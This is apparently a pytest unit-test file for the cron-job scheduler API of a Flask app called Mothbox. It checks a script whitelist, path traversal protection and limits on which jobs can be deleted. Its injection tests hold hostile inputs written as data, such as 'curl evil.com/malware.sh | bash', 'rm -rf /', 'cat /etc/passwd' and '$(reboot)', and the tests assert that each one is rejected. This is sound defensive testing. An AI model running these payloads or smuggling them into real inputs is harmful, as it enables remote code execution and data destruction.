"""
Unit tests for scheduler routes (Issue #78 - Phase 1)

Tests cron job management endpoints with focus on security:
- Command injection prevention via whitelist
- Path traversal protection
- Validation that only Mothbox jobs can be deleted

Coverage Target: 75%+ (scheduler.py is 145 lines)
"""

import pytest
import json
import sys
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock, call
from flask import Flask

# Mock crontab module before importing routes.scheduler
sys.modules['crontab'] = MagicMock()

# Import the blueprint
from routes.scheduler import scheduler_bp, ALLOWED_SCRIPTS


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def scheduler_app():
    """Flask app with scheduler blueprint for testing"""
    app = Flask(__name__)
    app.config['TESTING'] = True
    app.register_blueprint(scheduler_bp, url_prefix='/api/scheduler')
    return app


@pytest.fixture
def scheduler_client(scheduler_app):
    """Test client for scheduler routes"""
    return scheduler_app.test_client()


@pytest.fixture
def mock_crontab():
    """Mock CronTab for testing without actual cron access"""
    with patch('routes.scheduler.CronTab') as mock_crontab_class:
        mock_cron = MagicMock()
        mock_crontab_class.return_value = mock_cron
        yield mock_cron


@pytest.fixture
def sample_mothbox_jobs():
    """Sample Mothbox cron jobs for testing"""
    jobs = []

    # Create mock job objects
    for i, cmd in enumerate([
        '/usr/bin/python3 /home/pi/mothbox/TakePhoto.py',
        '/usr/bin/python3 /home/pi/mothbox/Scheduler.py',
        '/usr/bin/python3 /opt/mothbox/Backup_Files.py'
    ]):
        job = MagicMock()
        job.command = cmd
        job.slices = f'0 {i} * * *'  # Different schedules
        job.is_enabled.return_value = True
        job.comment = f'Mothbox job {i}'
        jobs.append(job)

    return jobs


# ============================================================================
# Test List Cron Jobs Endpoint
# ============================================================================

class TestSchedulerListJobs:
    """Tests for GET /api/scheduler/jobs"""

    def test_list_jobs_returns_mothbox_jobs_only(self, scheduler_client, mock_crontab, sample_mothbox_jobs):
        """GET /jobs returns only Mothbox jobs, filtering out system jobs"""
        # Add a non-Mothbox job that should be filtered out
        non_mothbox_job = MagicMock()
        non_mothbox_job.command = '/usr/bin/apt-get update'
        non_mothbox_job.slices = '0 0 * * *'
        non_mothbox_job.is_enabled.return_value = True
        non_mothbox_job.comment = 'System update'

        all_jobs = sample_mothbox_jobs + [non_mothbox_job]
        mock_crontab.__iter__.return_value = iter(all_jobs)

        response = scheduler_client.get('/api/scheduler/jobs')

        assert response.status_code == 200
        data = json.loads(response.data)
        assert 'jobs' in data

        # Should only return 3 Mothbox jobs, not the system job
        assert len(data['jobs']) == 3

        # Verify all returned jobs are Mothbox jobs
        for job in data['jobs']:
            assert 'mothbox' in job['command'].lower() or 'TakePhoto' in job['command']

    def test_list_jobs_includes_schedule_info(self, scheduler_client, mock_crontab, sample_mothbox_jobs):
        """GET /jobs includes schedule, command, enabled status, and comment"""
        mock_crontab.__iter__.return_value = iter(sample_mothbox_jobs)

        response = scheduler_client.get('/api/scheduler/jobs')

        assert response.status_code == 200
        data = json.loads(response.data)

        # Check first job has all required fields
        job = data['jobs'][0]
        assert 'command' in job
        assert 'schedule' in job
        assert 'enabled' in job
        assert 'comment' in job

        # Verify data types
        assert isinstance(job['command'], str)
        assert isinstance(job['schedule'], str)
        assert isinstance(job['enabled'], bool)
        assert isinstance(job['comment'], str)

    def test_list_jobs_shows_enabled_status(self, scheduler_client, mock_crontab):
        """GET /jobs correctly reports enabled/disabled status"""
        enabled_job = MagicMock()
        enabled_job.command = '/usr/bin/python3 /opt/mothbox/TakePhoto.py'
        enabled_job.slices = '0 * * * *'
        enabled_job.is_enabled.return_value = True
        enabled_job.comment = 'Enabled job'

        disabled_job = MagicMock()
        disabled_job.command = '/usr/bin/python3 /opt/mothbox/Backup_Files.py'
        disabled_job.slices = '0 0 * * *'
        disabled_job.is_enabled.return_value = False
        disabled_job.comment = 'Disabled job'

        mock_crontab.__iter__.return_value = iter([enabled_job, disabled_job])

        response = scheduler_client.get('/api/scheduler/jobs')

        assert response.status_code == 200
        data = json.loads(response.data)

        assert len(data['jobs']) == 2
        assert data['jobs'][0]['enabled'] is True
        assert data['jobs'][1]['enabled'] is False

    def test_list_jobs_handles_empty_crontab(self, scheduler_client, mock_crontab):
        """GET /jobs returns empty list when no jobs exist"""
        mock_crontab.__iter__.return_value = iter([])

        response = scheduler_client.get('/api/scheduler/jobs')

        assert response.status_code == 200
        data = json.loads(response.data)
        assert data['jobs'] == []

    def test_list_jobs_handles_crontab_error(self, scheduler_client):
        """GET /jobs returns 500 on crontab access error"""
        with patch('routes.scheduler.CronTab', side_effect=Exception("Crontab access denied")):
            response = scheduler_client.get('/api/scheduler/jobs')

            assert response.status_code == 500
            data = json.loads(response.data)
            assert 'error' in data


# ============================================================================
# Test Add Cron Job Endpoint
# ============================================================================

class TestSchedulerAddJob:
    """Tests for POST /api/scheduler/job"""

    def test_add_job_valid_script_key(self, scheduler_client, mock_crontab, monkeypatch):
        """POST /job creates cron job with whitelisted script"""
        # Mock get_script_path to return a valid path
        def mock_get_script_path(script_name):
            return Path(f'/opt/mothbox/{script_name}')

        monkeypatch.setattr('routes.scheduler.get_script_path', mock_get_script_path)

        # Mock job creation
        mock_job = MagicMock()
        mock_crontab.new.return_value = mock_job

        response = scheduler_client.post('/api/scheduler/job', json={
            'script_key': 'takephoto',
            'schedule': '0 * * * *',
            'comment': 'Hourly photo capture'
        })

        assert response.status_code == 200
        data = json.loads(response.data)
        assert data['success'] is True
        assert 'TakePhoto.py' in data['command']

        # Verify job was created with correct parameters
        mock_crontab.new.assert_called_once()
        call_args = mock_crontab.new.call_args
        assert '/usr/bin/python3' in call_args.kwargs['command']
        assert 'TakePhoto.py' in call_args.kwargs['command']

        # Verify schedule was set and crontab written
        mock_job.setall.assert_called_once_with('0 * * * *')
        mock_crontab.write.assert_called_once()

    def test_add_job_rejects_invalid_script_key(self, scheduler_client, mock_crontab):
        """POST /job rejects script_key not in whitelist (command injection prevention)"""
        malicious_attempts = [
            'evil_script',
            '../../../etc/passwd',
            'TakePhoto.py; rm -rf /',
            'scheduler && curl evil.com/malware.sh | bash'
        ]

        for malicious_key in malicious_attempts:
            response = scheduler_client.post('/api/scheduler/job', json={
                'script_key': malicious_key,
                'schedule': '0 * * * *'
            })

            assert response.status_code == 400, \
                f"Should reject invalid script_key: {malicious_key}"

            data = json.loads(response.data)
            assert 'error' in data
            assert 'Invalid script_key' in data['error']

        # Verify no jobs were created for malicious attempts
        mock_crontab.new.assert_not_called()

    def test_add_job_validates_cron_schedule(self, scheduler_client, mock_crontab, monkeypatch):
        """POST /job validates cron schedule format"""
        def mock_get_script_path(script_name):
            return Path(f'/opt/mothbox/{script_name}')

        monkeypatch.setattr('routes.scheduler.get_script_path', mock_get_script_path)

        mock_job = MagicMock()
        # Simulate invalid schedule causing an exception
        mock_job.setall.side_effect = ValueError("Invalid cron schedule")
        mock_crontab.new.return_value = mock_job

        response = scheduler_client.post('/api/scheduler/job', json={
            'script_key': 'takephoto',
            'schedule': 'invalid schedule format'
        })

        assert response.status_code == 500
        data = json.loads(response.data)
        assert 'error' in data

    def test_add_job_requires_script_key_and_schedule(self, scheduler_client, mock_crontab):
        """POST /job requires both script_key and schedule"""
        # Missing script_key
        response = scheduler_client.post('/api/scheduler/job', json={
            'schedule': '0 * * * *'
        })
        assert response.status_code == 400
        data = json.loads(response.data)
        assert 'Missing script_key or schedule' in data['error']

        # Missing schedule
        response = scheduler_client.post('/api/scheduler/job', json={
            'script_key': 'takephoto'
        })
        assert response.status_code == 400
        data = json.loads(response.data)
        assert 'Missing script_key or schedule' in data['error']

    def test_add_job_validates_script_path(self, scheduler_client, mock_crontab, monkeypatch):
        """POST /job validates script path against path traversal"""
        # Mock get_script_path to raise ValueError (path traversal detected)
        def mock_get_script_path(script_name):
            raise ValueError("Path traversal detected")

        monkeypatch.setattr('routes.scheduler.get_script_path', mock_get_script_path)

        response = scheduler_client.post('/api/scheduler/job', json={
            'script_key': 'takephoto',
            'schedule': '0 * * * *'
        })

        assert response.status_code == 400
        data = json.loads(response.data)
        assert 'Script path validation failed' in data['error']

        # Verify no job was created
        mock_crontab.new.assert_not_called()

    def test_add_job_with_comment(self, scheduler_client, mock_crontab, monkeypatch):
        """POST /job includes optional comment in cron job"""
        def mock_get_script_path(script_name):
            return Path(f'/opt/mothbox/{script_name}')

        monkeypatch.setattr('routes.scheduler.get_script_path', mock_get_script_path)

        mock_job = MagicMock()
        mock_crontab.new.return_value = mock_job

        response = scheduler_client.post('/api/scheduler/job', json={
            'script_key': 'backup',
            'schedule': '0 0 * * *',
            'comment': 'Daily backup at midnight'
        })

        assert response.status_code == 200

        # Verify comment was passed to cron.new()
        call_args = mock_crontab.new.call_args
        assert call_args.kwargs['comment'] == 'Daily backup at midnight'


# ============================================================================
# Test Delete Cron Job Endpoint
# ============================================================================

class TestSchedulerDeleteJob:
    """Tests for DELETE /api/scheduler/job"""

    def test_delete_job_mothbox_only(self, scheduler_client, mock_crontab):
        """DELETE /job only deletes validated Mothbox jobs"""
        # Mock MOTHBOX_HOME at module level (imported inside function)
        with patch('mothbox_paths.MOTHBOX_HOME', Path('/opt/mothbox')):
            mock_crontab.remove_all.return_value = 1  # 1 job removed

            response = scheduler_client.delete('/api/scheduler/job', json={
                'command': '/usr/bin/python3 /opt/mothbox/TakePhoto.py'
            })

            assert response.status_code == 200
            data = json.loads(response.data)
            assert data['success'] is True
            assert data['removed_count'] == 1

            # Verify remove_all was called with correct command
            mock_crontab.remove_all.assert_called_once_with(
                command='/usr/bin/python3 /opt/mothbox/TakePhoto.py'
            )
            mock_crontab.write.assert_called_once()

    def test_delete_job_rejects_non_mothbox_commands(self, scheduler_client, mock_crontab):
        """DELETE /job rejects commands that don't appear to be Mothbox jobs"""
        dangerous_commands = [
            '/usr/bin/apt-get update',
            '/bin/rm -rf /home',
            'reboot',
            '/usr/bin/python3 /etc/cron.daily/logrotate'
        ]

        for dangerous_cmd in dangerous_commands:
            response = scheduler_client.delete('/api/scheduler/job', json={
                'command': dangerous_cmd
            })

            assert response.status_code == 400, \
                f"Should reject non-Mothbox command: {dangerous_cmd}"

            data = json.loads(response.data)
            assert 'error' in data
            # Error message can be either "does not appear to be a Mothbox job" or "not within MOTHBOX_HOME"
            assert ('does not appear to be a Mothbox job' in data['error'] or
                    'not within MOTHBOX_HOME' in data['error'])

        # Verify no deletions occurred
        mock_crontab.remove_all.assert_not_called()

    def test_delete_job_path_validation(self, scheduler_client, mock_crontab):
        """DELETE /job validates command path is within MOTHBOX_HOME"""
        # Mock MOTHBOX_HOME at module level
        with patch('mothbox_paths.MOTHBOX_HOME', Path('/opt/mothbox')):
            # Try to delete a command outside MOTHBOX_HOME
            response = scheduler_client.delete('/api/scheduler/job', json={
                'command': '/usr/bin/python3 /home/attacker/evil.py'
            })

            assert response.status_code == 400
            data = json.loads(response.data)
            assert 'not within MOTHBOX_HOME' in data['error']

            # Verify no deletion occurred
            mock_crontab.remove_all.assert_not_called()

    def test_delete_job_returns_count(self, scheduler_client, mock_crontab):
        """DELETE /job returns count of removed jobs"""
        with patch('mothbox_paths.MOTHBOX_HOME', Path('/opt/mothbox')):
            # Simulate removing multiple jobs with same command
            mock_crontab.remove_all.return_value = 3

            response = scheduler_client.delete('/api/scheduler/job', json={
                'command': '/usr/bin/python3 /opt/mothbox/TakePhoto.py'
            })

            assert response.status_code == 200
            data = json.loads(response.data)
            assert data['removed_count'] == 3

    def test_delete_job_requires_command(self, scheduler_client, mock_crontab):
        """DELETE /job requires command parameter"""
        response = scheduler_client.delete('/api/scheduler/job', json={})

        assert response.status_code == 400
        data = json.loads(response.data)
        assert 'Missing command' in data['error']

        # Verify no deletion attempted
        mock_crontab.remove_all.assert_not_called()


# ============================================================================
# Test Scheduler Status Endpoint
# ============================================================================

class TestSchedulerStatus:
    """Tests for GET /api/scheduler/status"""

    def test_status_returns_cron_active_status(self, scheduler_client):
        """GET /status returns whether cron service is active"""
        # Mock subprocess at module level (imported inside function)
        mock_result = MagicMock()
        mock_result.stdout = 'active\n'

        # Mock get_script_path
        def mock_get_script_path(script_name):
            return Path(f'/opt/mothbox/{script_name}')

        with patch('subprocess.run', return_value=mock_result) as mock_run, \
             patch('routes.scheduler.get_script_path', mock_get_script_path):

            response = scheduler_client.get('/api/scheduler/status')

            assert response.status_code == 200
            data = json.loads(response.data)

            assert 'cron_active' in data
            assert data['cron_active'] is True
            assert 'scheduler_script' in data
            assert 'Scheduler.py' in data['scheduler_script']

            # Verify systemctl was called
            mock_run.assert_called_once()
            call_args = mock_run.call_args[0][0]
            assert 'systemctl' in call_args
            assert 'is-active' in call_args
            assert 'cron' in call_args

    def test_status_detects_inactive_cron(self, scheduler_client):
        """GET /status detects when cron service is inactive"""
        mock_result = MagicMock()
        mock_result.stdout = 'inactive\n'

        def mock_get_script_path(script_name):
            return Path(f'/opt/mothbox/{script_name}')

        with patch('subprocess.run', return_value=mock_result), \
             patch('routes.scheduler.get_script_path', mock_get_script_path):

            response = scheduler_client.get('/api/scheduler/status')

            assert response.status_code == 200
            data = json.loads(response.data)
            assert data['cron_active'] is False

    def test_status_handles_systemctl_error(self, scheduler_client):
        """GET /status handles systemctl errors gracefully"""
        with patch('subprocess.run', side_effect=Exception("systemctl not found")):
            response = scheduler_client.get('/api/scheduler/status')

            assert response.status_code == 500
            data = json.loads(response.data)
            assert 'error' in data


# ============================================================================
# Test Scheduler Security
# ============================================================================

class TestSchedulerSecurity:
    """Security-focused tests for scheduler endpoints"""

    def test_command_injection_prevention(self, scheduler_client, mock_crontab):
        """Scheduler endpoints prevent command injection via whitelist"""
        injection_attempts = [
            'takephoto; rm -rf /',
            'takephoto && curl evil.com/malware.sh | bash',
            'takephoto || cat /etc/passwd',
            '`whoami`',
            '$(reboot)',
            'takephoto\nrm -rf /'
        ]

        for injection in injection_attempts:
            response = scheduler_client.post('/api/scheduler/job', json={
                'script_key': injection,
                'schedule': '0 * * * *'
            })

            assert response.status_code == 400, \
                f"Should block injection attempt: {injection}"

            data = json.loads(response.data)
            assert 'Invalid script_key' in data['error']

        # Verify no jobs were created
        mock_crontab.new.assert_not_called()

    def test_path_traversal_prevention(self, scheduler_client, mock_crontab, monkeypatch):
        """Scheduler validates paths via get_script_path"""
        # Even if script_key is in whitelist, path validation should catch traversal
        def mock_get_script_path(script_name):
            # Simulate get_script_path detecting traversal
            if '..' in script_name or script_name.startswith('/'):
                raise ValueError("Path traversal detected")
            return Path(f'/opt/mothbox/{script_name}')

        monkeypatch.setattr('routes.scheduler.get_script_path', mock_get_script_path)

        # This won't reach get_script_path because whitelist check comes first
        response = scheduler_client.post('/api/scheduler/job', json={
            'script_key': '../../../etc/passwd',
            'schedule': '0 * * * *'
        })

        assert response.status_code == 400
        assert mock_crontab.new.assert_not_called

    def test_whitelist_enforcement(self, scheduler_client, mock_crontab):
        """Scheduler strictly enforces ALLOWED_SCRIPTS whitelist"""
        # Get all allowed keys
        allowed_keys = list(ALLOWED_SCRIPTS.keys())

        # Test that all allowed keys work (with mocking)
        with patch('routes.scheduler.get_script_path', return_value=Path('/opt/mothbox/test.py')):
            mock_job = MagicMock()
            mock_crontab.new.return_value = mock_job

            for key in allowed_keys:
                response = scheduler_client.post('/api/scheduler/job', json={
                    'script_key': key,
                    'schedule': '0 * * * *'
                })

                # Should succeed for whitelisted keys
                assert response.status_code == 200, \
                    f"Whitelisted key should work: {key}"

        # Test that non-whitelisted key fails
        response = scheduler_client.post('/api/scheduler/job', json={
            'script_key': 'not_in_whitelist',
            'schedule': '0 * * * *'
        })

        assert response.status_code == 400

    def test_delete_validation_prevents_system_job_deletion(self, scheduler_client, mock_crontab):
        """DELETE /job prevents deletion of critical system jobs"""
        system_jobs = [
            '/usr/sbin/logrotate /etc/logrotate.conf',
            '/usr/bin/apt-get update && /usr/bin/apt-get upgrade -y',
            'journalctl --vacuum-time=7d'
        ]

        for system_job in system_jobs:
            response = scheduler_client.delete('/api/scheduler/job', json={
                'command': system_job
            })

            assert response.status_code == 400, \
                f"Should prevent deletion of system job: {system_job}"

        # Verify no deletions occurred
        mock_crontab.remove_all.assert_not_called()
